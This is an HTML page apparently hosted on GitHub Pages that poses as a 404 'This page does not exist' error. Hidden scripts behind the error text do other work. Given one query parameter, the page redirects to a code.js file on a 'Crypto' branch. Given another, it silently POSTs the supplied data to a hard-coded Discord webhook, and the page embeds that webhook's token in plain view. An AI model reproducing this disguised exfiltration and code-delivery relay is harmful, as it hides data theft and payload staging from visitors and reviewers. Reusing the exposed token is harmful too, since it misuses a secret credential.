<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex">
    <title>ZeZo Hub | Site not found 404</title>

    <script>
        // nf = 404 page, getdata = redirect to code, data = send to webhook
        (function () {
            var p = new URLSearchParams(location.search);
            var mode = p.has("getdata") ? "getdata" : (p.get("data") ? "data" : "nf");
            document.documentElement.setAttribute("data-mode", mode);
            if (mode !== "nf") document.title = "Data send!";
        })();
    </script>

    <style>
        /* Black page for ?getdata and ?data=... */
        html:not([data-mode="nf"]),
        html:not([data-mode="nf"]) body {
            height: 100%;
            margin: 0;
            background: #000;
        }
        html:not([data-mode="nf"]) #nf {
            display: none;
        }

        /* 404 page */
        html[data-mode="nf"],
        html[data-mode="nf"] body {
            height: 100%;
            margin: 0;
        }
        html[data-mode="nf"] body {
            display: flex;
            align-items: center;
            justify-content: center;
            background: #0d1117;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
            text-align: center;
            overflow: hidden;
        }
        #nf h1 {
            position: relative;
            z-index: 0;
            font-size: 1.5rem;
            font-weight: 600;
            padding: 0 16px;
            margin: 0;
            color: #e6f4ff;
        }

        /* Glow behind the text, revealed by a sweeping mask */
        #nf h1::after {
            content: attr(data-text);
            position: absolute;
            inset: -60px -80px;
            z-index: -1;
            padding: 60px 96px;
            color: transparent;
            text-shadow:
                0 0 3px rgba(88, 166, 255, 1),
                0 0 8px rgba(88, 166, 255, 0.9),
                0 0 16px rgba(88, 166, 255, 0.7),
                0 0 28px rgba(88, 166, 255, 0.5);
            -webkit-mask-image: linear-gradient(90deg,
                transparent 0%, transparent 34%, rgba(0,0,0,.35) 42%, #000 50%,
                rgba(0,0,0,.35) 58%, transparent 66%, transparent 100%);
            mask-image: linear-gradient(90deg,
                transparent 0%, transparent 34%, rgba(0,0,0,.35) 42%, #000 50%,
                rgba(0,0,0,.35) 58%, transparent 66%, transparent 100%);
            -webkit-mask-size: 300% 100%;
            mask-size: 300% 100%;
            -webkit-mask-repeat: no-repeat;
            mask-repeat: no-repeat;
            -webkit-mask-position: 100% 0;
            mask-position: 100% 0;
            animation: edge-sweep 2.8s linear infinite;
        }
        @keyframes edge-sweep {
            from { -webkit-mask-position: 90% 0; mask-position: 90% 0; }
            to   { -webkit-mask-position: 10% 0; mask-position: 10% 0; }
        }
        @media (prefers-reduced-motion: reduce) {
            #nf h1::after {
                animation: none;
                -webkit-mask-image: none;
                mask-image: none;
                opacity: 0.6;
            }
        }
    </style>
</head>

<body>
    <div id="nf">
        <h1 data-text="This page does not exist.">This page does not exist.</h1>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1569351685149565069/0PVhYZTuXdt88auohD52jtTuxWZnQe5-Sx31tS-HdMX7geyYcYEavrzr3ildLjgN1BqI";
        const CODE_FILE = "code.js";
        const BRANCH = "Crypto";
        const MAX_LEN = 1000;

        // Builds the raw GitHub URL from [name].github.io/[repo]/
        function rawUrl() {
            const owner = location.hostname.split(".")[0];
            const seg = location.pathname.split("/").filter(Boolean)[0];
            const repo = seg && !seg.endsWith(".html") ? seg : owner + ".github.io";
            return "https://raw.githubusercontent.com/" + owner + "/" + repo + "/" + BRANCH + "/" + CODE_FILE;
        }

        async function main() {
            const mode = document.documentElement.getAttribute("data-mode");
            if (mode === "nf") return;

            if (mode === "getdata") {
                location.replace(rawUrl());
                return;
            }

            const data = new URLSearchParams(location.search).get("data");
            if (data.length > MAX_LEN) return;

            // Don't send the same data twice on reload
            const key = "sent:" + data;
            if (sessionStorage.getItem(key)) return;

            try {
                const res = await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        content: "Microbit: " + data, // Discord
                        text: "Microbit: " + data,    // Slack / Mattermost
                        data: data                    // generic webhooks
                    })
                });
                if (!res.ok) throw new Error("HTTP " + res.status);
                sessionStorage.setItem(key, "1");
            } catch (err) {
                console.error("Error while sending:", err);
            }
        }

        main();
    </script>
</body>
</html>
